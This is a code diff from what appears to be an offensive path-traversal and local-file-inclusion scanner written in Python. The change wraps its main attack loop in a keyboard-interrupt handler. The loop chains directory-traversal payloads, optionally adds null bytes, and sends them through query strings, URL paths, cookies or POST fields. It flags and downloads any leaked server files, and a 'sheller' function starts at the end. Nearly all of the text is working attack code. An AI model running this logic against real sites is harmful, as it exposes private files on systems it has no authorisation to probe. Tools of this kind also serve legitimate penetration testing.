@@ -272,86 +272,49 @@ def phase2(attack, url, url2, keyword, cookie, selected, files, dirs, depth, ver
             con2 = s.post(url, data={}, timeout=timeout).content
         except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
             sys.exit("Timeout with the initial check.")
-    for dir in dirs:
-        for file in files:
-            d=1
-            while d <= depth:
-                for i in selected_payloads:
-                    traverse=''
-                    j=1
-                    #chain traversal payloads
-                    while j <= d:
-                        traverse+=i
-                        j+=1
 
-                    #send attack requests - with or without nullbyte injection
-                    requestlist = []
-                    if selected_nullbytes == []:
-                        data = {}
-                        if attack == 1:
-                            prep, p = query(traverse, dir, file, "", keyword, url, url2, s)
-                            try:
-                                r = s.send(prep, timeout=timeout)
-                            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                                print("Timeout reached for " + url)
-                                continue
-                        elif attack == 2:
-                            prep, p = inpath(traverse, dir, file, "", url, url2, s)
-                            try:
-                                r = s.send(prep, timeout=timeout)
-                            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                                print("Timeout reached for " + url)
-                                continue
-                        elif attack == 3:
-                            p = traverse + dir + file
-                            s.cookies.set(selected, traverse + dir + file)
-                            try:
-                                r = s.get(url, timeout=timeout)
-                            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                                print("Timeout reached for " + url)
-                                continue
-                            #print(s.cookies)
-                        elif attack == 4:
-                            p = traverse + dir + file
-                            for prop in postdata.split("&"):
-                                pair = prop.split("=")
-                                if pair[1].strip() == "INJECT":
-                                    pair[1] = p
-                                data[pair[0].strip()] = pair[1].strip()
-                            assert data != {}
-                            try:
-                                r = s.post(url, data=data, timeout=timeout)
-                            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                                print("Timeout reached for " + url)
-                                continue
-                        requestlist.append((r, p, data))
-                    else:
-                        for nb in selected_nullbytes:
+    try:
+        for dir in dirs:
+            for file in files:
+                d=1
+                while d <= depth:
+                    for i in selected_payloads:
+                        traverse=''
+                        j=1
+                        #chain traversal payloads
+                        while j <= d:
+                            traverse+=i
+                            j+=1
+
+                        #send attack requests - with or without nullbyte injection
+                        requestlist = []
+                        if selected_nullbytes == []:
                             data = {}
                             if attack == 1:
-                                prep, p = query(traverse, dir, file, nb, keyword, url, url2, s)
+                                prep, p = query(traverse, dir, file, "", keyword, url, url2, s)
                                 try:
                                     r = s.send(prep, timeout=timeout)
                                 except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                                     print("Timeout reached for " + url)
                                     continue
                             elif attack == 2:
-                                prep, p = inpath(traverse, dir, file, nb, url, url2, s)
+                                prep, p = inpath(traverse, dir, file, "", url, url2, s)
                                 try:
                                     r = s.send(prep, timeout=timeout)
                                 except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                                     print("Timeout reached for " + url)
                                     continue
                             elif attack == 3:
-                                p = traverse + dir + file + nb
-                                s.cookies.set(selected, traverse + dir + file + nb)
+                                p = traverse + dir + file
+                                s.cookies.set(selected, traverse + dir + file)
                                 try:
                                     r = s.get(url, timeout=timeout)
                                 except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                                     print("Timeout reached for " + url)
                                     continue
+                                #print(s.cookies)
                             elif attack == 4:
-                                p = traverse + dir + file + nb
+                                p = traverse + dir + file
                                 for prop in postdata.split("&"):
                                     pair = prop.split("=")
                                     if pair[1].strip() == "INJECT":
@@ -364,64 +327,105 @@ def phase2(attack, url, url2, keyword, cookie, selected, files, dirs, depth, ver
                                     print("Timeout reached for " + url)
                                     continue
                             requestlist.append((r, p, data))
-
-                    #analyze result
-                    for (r, p, data) in requestlist:
-                        requestcount += 1
-                        if sys.platform.lower().startswith('win'):
-                            if requestcount % 1000 == 0:
-                                progresswin(requestcount, totalrequests, prefix=" ", suffix=" ")
                         else:
-                            progress(requestcount, totalrequests, prefix=" ", suffix=" ")
+                            for nb in selected_nullbytes:
+                                data = {}
+                                if attack == 1:
+                                    prep, p = query(traverse, dir, file, nb, keyword, url, url2, s)
+                                    try:
+                                        r = s.send(prep, timeout=timeout)
+                                    except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+                                        print("Timeout reached for " + url)
+                                        continue
+                                elif attack == 2:
+                                    prep, p = inpath(traverse, dir, file, nb, url, url2, s)
+                                    try:
+                                        r = s.send(prep, timeout=timeout)
+                                    except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+                                        print("Timeout reached for " + url)
+                                        continue
+                                elif attack == 3:
+                                    p = traverse + dir + file + nb
+                                    s.cookies.set(selected, traverse + dir + file + nb)
+                                    try:
+                                        r = s.get(url, timeout=timeout)
+                                    except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+                                        print("Timeout reached for " + url)
+                                        continue
+                                elif attack == 4:
+                                    p = traverse + dir + file + nb
+                                    for prop in postdata.split("&"):
+                                        pair = prop.split("=")
+                                        if pair[1].strip() == "INJECT":
+                                            pair[1] = p
+                                        data[pair[0].strip()] = pair[1].strip()
+                                    assert data != {}
+                                    try:
+                                        r = s.post(url, data=data, timeout=timeout)
+                                    except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+                                        print("Timeout reached for " + url)
+                                        continue
+                                requestlist.append((r, p, data))
 
-                        vfound = False
-                        if str(r.status_code).startswith("2") or r.status_code == 302:
-                            if filecheck(r, con2, p) and attack != 4 or filecheck(r, con2, p, post=True) and attack == 4:
-                                vfound = True
+                        #analyze result
+                        for (r, p, data) in requestlist:
+                            requestcount += 1
+                            if sys.platform.lower().startswith('win'):
+                                if requestcount % 1000 == 0:
+                                    progresswin(requestcount, totalrequests, prefix=" ", suffix=" ")
+                            else:
+                                progress(requestcount, totalrequests, prefix=" ", suffix=" ")
+
+                            vfound = False
+                            if str(r.status_code).startswith("2") or r.status_code == 302:
+                                if filecheck(r, con2, p) and attack != 4 or filecheck(r, con2, p, post=True) and attack == 4:
+                                    vfound = True
+                                    if attack == 1 or attack == 2:
+                                        print(color.RD+"[INFO]"+color.O+" leak"+color.END+"       "+color.RD+"statvs-code"+color.END+"="+color.O+str(r.status_code)+color.END+" "+color.R+"site"+color.END+"="+r.url)
+                                        if dl and dir+file not in found:
+                                            download(r.url,dir+file, cookie=s.cookies)
+                                        found.append(dir+file)
+                                        if attack == 1:
+                                            urls.append(color.RD + "[pl]" + color.END + color.O + " " +  str(r.status_code) + color.END + " " + r.url.split(keyword+"=")[1].replace(url2, ""))
+                                        else:
+                                            vlnlist = r.url.split("/")[1::]
+                                            vlnpath = ("/".join(i for i in vlnlist)).replace(url2, "")
+                                            urls.append(color.RD + "[pl]" + color.END + color.O + " " +  str(r.status_code) + color.END + " " + vlnpath)
+                                    elif attack == 3:
+                                        s.cookies.set(selected, p)
+                                        print(color.RD+"[INFO]"+color.O+" leak"+color.END+"       "+color.RD+"statvs-code"+color.END+"="+color.O+str(r.status_code)+color.END+" "+color.R+"cookie"+color.END+"="+p)
+                                        if dl and dir+file not in found:
+                                            download(r.url,dir+file,cookie=s.cookies)
+                                        found.append(dir+file)
+                                        urls.append(color.RD + "[pl]" + color.END + color.O + " " +  str(r.status_code) + color.END + " " + p)
+                                    elif attack == 4:
+                                        print(color.RD+"[INFO]"+color.O+" leak"+color.END+"       "+color.RD+"statvs-code"+color.END+"="+color.O+str(r.status_code)+color.END+" "+color.R+"postdata"+color.END+"="+p)
+                                        if dl and dir+file not in found:
+                                            download(r.url,dir+file,cookie=s.cookies,post=data)
+                                        found.append(dir+file)
+                                        urls.append(color.RD + "[pl]" + color.END + color.O + " " +  str(r.status_code) + color.END + " " + p)
+                            elif r.status_code == 403 and attack != 2:
                                 if attack == 1 or attack == 2:
                                     print(color.RD+"[INFO]"+color.O+" leak"+color.END+"       "+color.RD+"statvs-code"+color.END+"="+color.O+str(r.status_code)+color.END+" "+color.R+"site"+color.END+"="+r.url)
-                                    if dl and dir+file not in found:
-                                        download(r.url,dir+file, cookie=s.cookies)
                                     found.append(dir+file)
-                                    if attack == 1:
-                                        urls.append(color.RD + "[pl]" + color.END + color.O + " " +  str(r.status_code) + color.END + " " + r.url.split(keyword+"=")[1].replace(url2, ""))
-                                    else:
-                                        vlnlist = r.url.split("/")[1::]
-                                        vlnpath = ("/".join(i for i in vlnlist)).replace(url2, "")
-                                        urls.append(color.RD + "[pl]" + color.END + color.O + " " +  str(r.status_code) + color.END + " " + vlnpath)
+                                    urls.append(color.RD + "[pl]" + color.END + color.O + " " +  str(r.status_code) + color.END + " " + r.url.split(keyword+"=")[1].replace(url2, ""))
                                 elif attack == 3:
-                                    s.cookies.set(selected, p)
                                     print(color.RD+"[INFO]"+color.O+" leak"+color.END+"       "+color.RD+"statvs-code"+color.END+"="+color.O+str(r.status_code)+color.END+" "+color.R+"cookie"+color.END+"="+p)
-                                    if dl and dir+file not in found:
-                                        download(r.url,dir+file,cookie=s.cookies)
                                     found.append(dir+file)
                                     urls.append(color.RD + "[pl]" + color.END + color.O + " " +  str(r.status_code) + color.END + " " + p)
                                 elif attack == 4:
                                     print(color.RD+"[INFO]"+color.O+" leak"+color.END+"       "+color.RD+"statvs-code"+color.END+"="+color.O+str(r.status_code)+color.END+" "+color.R+"postdata"+color.END+"="+p)
-                                    if dl and dir+file not in found:
-                                        download(r.url,dir+file,cookie=s.cookies,post=data)
                                     found.append(dir+file)
                                     urls.append(color.RD + "[pl]" + color.END + color.O + " " +  str(r.status_code) + color.END + " " + p)
-                        elif r.status_code == 403 and attack != 2:
-                            if attack == 1 or attack == 2:
-                                print(color.RD+"[INFO]"+color.O+" leak"+color.END+"       "+color.RD+"statvs-code"+color.END+"="+color.O+str(r.status_code)+color.END+" "+color.R+"site"+color.END+"="+r.url)
-                                found.append(dir+file)
-                                urls.append(color.RD + "[pl]" + color.END + color.O + " " +  str(r.status_code) + color.END + " " + r.url.split(keyword+"=")[1].replace(url2, ""))
-                            elif attack == 3:
-                                print(color.RD+"[INFO]"+color.O+" leak"+color.END+"       "+color.RD+"statvs-code"+color.END+"="+color.O+str(r.status_code)+color.END+" "+color.R+"cookie"+color.END+"="+p)
-                                found.append(dir+file)
-                                urls.append(color.RD + "[pl]" + color.END + color.O + " " +  str(r.status_code) + color.END + " " + p)
-                            elif attack == 4:
-                                print(color.RD+"[INFO]"+color.O+" leak"+color.END+"       "+color.RD+"statvs-code"+color.END+"="+color.O+str(r.status_code)+color.END+" "+color.R+"postdata"+color.END+"="+p)
-                                found.append(dir+file)
-                                urls.append(color.RD + "[pl]" + color.END + color.O + " " +  str(r.status_code) + color.END + " " + p)
-                        if verbose and not vfound:
-                            if attack == 1 or attack == 2:
-                                print(color.END + "{}|: ".format(r.status_code)+r.url)
-                            elif attack == 3 or attack == 4:
-                                print(color.END + "{}|: ".format(r.status_code)+r.url + " : " + p)
-                d+=1
-    return (found, urls)
+                            if verbose and not vfound:
+                                if attack == 1 or attack == 2:
+                                    print(color.END + "{}|: ".format(r.status_code)+r.url)
+                                elif attack == 3 or attack == 4:
+                                    print(color.END + "{}|: ".format(r.status_code)+r.url + " : " + p)
+                    d+=1
+        return (found, urls)
+    except KeyboardInterrupt:
+        return (found, urls)
 
 def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, paylist, nullist, authcookie, postdata):
     #resolve issues with inpath attack
